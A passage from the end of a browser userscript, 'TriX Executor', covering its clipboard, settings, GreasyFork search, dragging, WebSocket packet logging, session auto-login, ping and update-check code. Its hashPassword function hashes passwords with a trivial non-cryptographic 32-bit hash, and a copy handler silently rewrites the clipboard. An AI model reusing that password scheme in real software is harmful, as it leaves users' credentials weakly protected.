          const termsUrl = 'https://example.com/trix-executor-terms';
          const notice = `\n\n---- LEGAL NOTICE ----\n© 2025 Painsel / COURTESYCOIL. All rights reserved.\nThis code is proprietary and provided for your personal use only. Unauthorized copying, distribution, modification, or public posting is strictly prohibited.\nBy copying this text you acknowledge and agree to the Terms: ${termsUrl}`;
          e.clipboardData.setData('text/plain', text + notice);
          e.preventDefault();
          showNotification('Copied with legal notice and terms URL appended', 'warning', 3000);
        }
      } catch (err) {
        // ignore
      }
    });
 
    // Context menu handler: discourage direct saving of the editor contents
    document.addEventListener('contextmenu', e => {
      const editor = document.getElementById('script-editor');
      if (editor && editor.contains(e.target)) {
        // Allow context menu but show a subtle notice
        showNotification('This content is proprietary. Copying or redistribution is restricted.', 'warning', 2500);
      }
    });
 
    // Input handler for editor content and search
    p.addEventListener('input', e => {
      if (e.target.matches('#script-editor')) {
        const t = scriptTabs.find(tab => tab.id === activeScriptTab);
        if (t) t.content = e.target.value;
      }
      if (e.target.matches('#script-search')) {
        const q = e.target.value.toLowerCase();
        p.querySelectorAll('#saved-scripts .script-card').forEach(c => {
          const t = c.querySelector('.card-title').textContent.toLowerCase();
          c.style.display = t.includes(q) ? 'block' : 'none';
        });
      }
    });
 
    // Change handler: persist settings when any checkbox in settings-content changes
    p.addEventListener('change', e => {
      if (!e.target.closest || !e.target.closest('#settings-content')) return;
      const elAnti = document.getElementById('anti-scam');
      const elBlockProp = document.getElementById('block-propaganda');
      const elSocket = document.getElementById('socket-toasts');
      const elShowAd = document.getElementById('show-ad');
      const elShowAll = document.getElementById('show-on-all-sites');
      const elPropToasts = document.getElementById('propaganda-toasts');
      const elDdosMitigation = document.getElementById('ddos-mitigation');
      const elAutoReconnect = document.getElementById('auto-reconnect');
      settings.antiScam = !!(elAnti && elAnti.checked);
      settings.blockPropaganda = !!(elBlockProp && elBlockProp.checked);
      settings.socketToasts = !!(elSocket && elSocket.checked);
      settings.showAd = !!(elShowAd && elShowAd.checked);
      settings.showOnAllSites = !!(elShowAll && elShowAll.checked);
      settings.propagandaToasts = !!(elPropToasts && elPropToasts.checked);
      settings.ddosMitigation = !!(elDdosMitigation && elDdosMitigation.checked);
      settings.autoReconnect = !!(elAutoReconnect && elAutoReconnect.checked);
      ddosReport.enabled = settings.ddosMitigation;
      GM_setValue('settings', JSON.stringify(settings));
      showNotification('Settings saved');
    });
 
    // GreasyFork search handlers (Enter key + Search button)
    p.addEventListener('keydown', e => {
      try {
        if (e.key === 'Enter' && e.target && (e.target.matches('#greasyfork-search') || e.target.matches('#greasyfork-author') || e.target.matches('#greasyfork-tags'))) {
          e.preventDefault();
          triggerGreasyForkSearch();
        }
      } catch (err) { /* ignore */ }
    });
    const searchBtn = p.querySelector('#greasyfork-search-btn');
    if (searchBtn) searchBtn.addEventListener('click', e => { e.preventDefault(); triggerGreasyForkSearch(); });
 
    function triggerGreasyForkSearch() {
      const q = (document.getElementById('greasyfork-search') || {}).value || '';
      const author = (document.getElementById('greasyfork-author') || {}).value || '';
      const tags = (document.getElementById('greasyfork-tags') || {}).value || '';
      const sort = (document.getElementById('greasyfork-sort') || {}).value || '';
      searchGreasyFork(q, { author, tags, sort });
    }
 
    // Dragging for the header
    let isDragging = false, dragOffset = { x: 0, y: 0 };
    const header = p.querySelector('.trix-header');
    if (header) {
      header.onmousedown = e => { if (e.target.closest('.trix-btn')) return; isDragging = true; const r = p.getBoundingClientRect(); dragOffset = { x: e.clientX - r.left, y: e.clientY - r.top }; e.preventDefault(); };
    }
    document.addEventListener('mousemove', e => { if (isDragging && !isMinimized) { const x = e.clientX - dragOffset.x, y = e.clientY - dragOffset.y; p.style.left = Math.max(0, Math.min(x, window.innerWidth - p.offsetWidth)) + 'px'; p.style.top = Math.max(0, Math.min(y, window.innerHeight - p.offsetHeight)) + 'px'; p.style.right = 'auto'; } });
    document.addEventListener('mouseup', () => { isDragging = false; });
  }
  
  function hashPassword(pwd) {
    let hash = 0;
    for (let i = 0; i < pwd.length; i++) {
      const char = pwd.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
  }
  
  
 
  function init() {
    createExecutorPanel();
    attachEventListeners();
    
    // Wire Sign-In button
    const signinBtn = document.getElementById('trix-signin-btn');
    if (signinBtn) {
      signinBtn.addEventListener('click', showSignInModal);
    }
    
    // Wire Settings button
    const settingsBtn = document.getElementById('trix-account-settings-btn');
    if (settingsBtn) {
      settingsBtn.addEventListener('click', showAccountModal);
    }
    
    // Auto-login from persistent session if valid
    const sessionStr = GM_getValue('trix_user_session');
    if (sessionStr) {
      try {
        const session = JSON.parse(sessionStr);
        if (session && session.expiry && session.expiry > Date.now() && session.user) {
          // Session is still valid, auto-login
          const savedProfilePic = localStorage.getItem('trix_profile_pic');
          currentUser = session.user;
          if (savedProfilePic) {
            currentUser.profilePic = savedProfilePic;
          }
          updateUserProfile();
        }
      } catch (err) {
        // Invalid session data, ignore
      }
    }
 
    // Only render sign-in overlay if not logged in
    if (!currentUser) {
      renderSignInOverlay();
    }
    
    document.onkeydown=e=>{if(e.ctrlKey&&e.shiftKey&&e.key.toUpperCase()==="E"){e.preventDefault();const p=document.querySelector('.trix-executor');if(!p){showLoadingScreen(init)}else if(isMinimized)restorePanel();else minimizePanel()}};
    logPacketCallback=(ws,type,data)=>{const c=monitoredConnections.get(ws);if(c){c.log.push({type,data});if(c.log.length>200)c.log.shift();if(currentTab==='network'&&activeNetworkTab==='logger'&&!isLoggerSuspended)renderPacketLog()}};
    onConnectionStateChange=()=>{if(currentTab==='network'&&activeNetworkTab==='logger')renderPacketLog()};
    updateConnectionStatus=(status,title)=>{const e=document.getElementById('trix-conn-status');if(e){e.className=status;e.title=title}};
    
    // Request throttling to prevent 503 errors
    let lastPingTime=0,consecutiveErrors=0,pingInterval=15000;
    updatePingDisplay=async()=>{
      const e=document.getElementById('trix-ping-display');
      if(!e||!isMinimized===false)return;
      const now=Date.now();
      if(now-lastPingTime<pingInterval)return;
      lastPingTime=now;
      const s=performance.now();
      try{
        const res=await fetch(`${window.location.protocol}//${window.location.host}/favicon.ico?_=${Date.now()}`,{method:'HEAD',cache:'no-store',timeout:5000});
        if(res.status===503){
          consecutiveErrors++;
          pingInterval=Math.min(60000,15000+(consecutiveErrors*5000));
          e.textContent='Ping: 503 (Server busy)';
          e.style.color='#ff9800';
          return;
        }
        consecutiveErrors=0;
        pingInterval=15000;
        e.textContent=`Ping: ${Math.round(performance.now()-s)}ms`;
        e.style.color='rgba(255,255,255,0.8)';
      }catch(err){
        consecutiveErrors++;
        pingInterval=Math.min(60000,15000+(consecutiveErrors*5000));
        e.textContent='Ping: Error';
        e.style.color='#ff6b6b';
      }
    };
    setInterval(updatePingDisplay,5000);
    let lastFrameTime=performance.now(),frameCount=0;
    function updateFPS(now){const fpsDisplay=document.getElementById('trix-fps-display');frameCount++;if(now>=lastFrameTime+1000){if(fpsDisplay)fpsDisplay.textContent=`FPS: ${frameCount}`;lastFrameTime=now;frameCount=0}requestAnimationFrame(updateFPS)}
    requestAnimationFrame(updateFPS);
    
    // Request deduplication & caching
    let lastUpdateCheckTime=0,updateCheckInterval=3600000,cachedVersion=null;
    (async()=>{
      const now=Date.now();
      if(now-lastUpdateCheckTime<updateCheckInterval)return;
      lastUpdateCheckTime=now;
      GM_xmlhttpRequest({method:'GET',url:'https://greasyfork.org/en/scripts/549132.json',timeout:10000,onload:res=>{try{const latest=JSON.parse(res.responseText).version;cachedVersion=latest;if(CURRENT_VERSION!==latest){if(!shouldShowUpdateReminder)showUpdateModal();else isUpdateAvailable=true;}else{GM_setValue("showUpdateReminder",false);shouldShowUpdateReminder=false}}catch(e){console.error("Failed to check for updates.")}},onerror:()=>{console.warn("Update check failed - may be rate limited")}});
    })();
    
    // Check if changelog should be shown for this version
    setTimeout(() => {
      if (CURRENT_VERSION !== LAST_SHOWN_VERSION && CHANGELOG[CURRENT_VERSION]) {
        showChangelogModal(CURRENT_VERSION);
      }
    }, 1000);
    
    loadSavedScripts();
    updateScriptTabs();
    document.querySelector('.trix-executor').classList.add('ready');
    showNotification("TriX Executor loaded! Press Ctrl+Shift+E to toggle.");
  }
  
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => showLoadingScreen(init));
  } else {
    showLoadingScreen(init);
  }
})();